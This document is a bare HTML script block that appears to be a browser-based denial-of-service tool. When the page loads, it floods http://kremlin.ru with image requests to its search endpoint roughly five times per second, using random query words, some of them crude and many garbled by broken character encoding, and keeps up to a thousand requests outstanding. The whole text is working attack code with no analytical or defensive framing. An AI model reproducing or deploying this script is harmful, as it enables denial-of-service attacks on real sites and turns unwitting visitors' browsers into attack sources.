<script>
(function () {
	var targetURL = "http://kremlin.ru";
	var fireInterval;
	var isFiring = false;
	var requestsHT = {};
	var requestedCtr = 0,
		succeededCtr = 0,
		failedCtr = 0;
	var makeHttpRequest = function () {
			if (requestedCtr > failedCtr + succeededCtr + 1000) {
				return;
			};
			var pg=new Array("asss","beet","cast","door","erro","fogy","gout","hell","jizz","know","lemo","meet","noob","oral","prik","quest","rezo","seek","took","ussr","vlog","week","xbox","ynou","zara","1989","2012","3567","4361","5772","6097","7109","8452","9832",1090,1157,1232,1364,1488,1500,1601,1746,1882,1933,2011,"����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","������","����","����","���","����","����","����","����","����","����","����","����","����","����","���","����","����","����","����","����","����","����","����","����","���","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","���","����","����","����","����","����","����","����","����","����","����","���","����","����","����","����","�����","����","����","����","����","���","����","����","����","����","����","����","����","����","����","����","����","����","�����","����","����","����","�","����","����","����","����","����","����","����","����","����","����","���","�����","����","����","�����","����","����","����","����","����","����","����","����","����","�����","����","����","����","����","����","����","����","���","����","����","����","����","����","����","����","�����","����","����","����","����","����","����","������","����","����","����","�����","����","����","���","����","����","����","����","����","����","����","����","����","����","���","�����","��","��","��","��","��","����","�����","����","����","����","����","����","����","�����","����","����","����","�����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����","����");
			var rID = Math.floor(Math.random()*pg.length); 
			var img = new Image();
			img.onerror = function () { onFail(rID); };
			img.onabort = function () { onFail(rID); };
			img.onload = function () { onSuccess(rID); };
			img.setAttribute("src", targetURL + "/search?query=" + pg[rID]);
			requestsHT[rID] = img;
			onRequest(rID);
		};
	var onRequest = function (rID) {
			requestedCtr++;
		};
	var onComplete = function (rID) {
			delete requestsHT[rID];
		};
	var onFail = function (rID) {
			failedCtr++;
			delete requestsHT[rID];
		};
	var onSuccess = function (rID) {
			succeededCtr++;
			delete requestsHT[rID];
		};
	fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(5) | 0));
})();
</script>
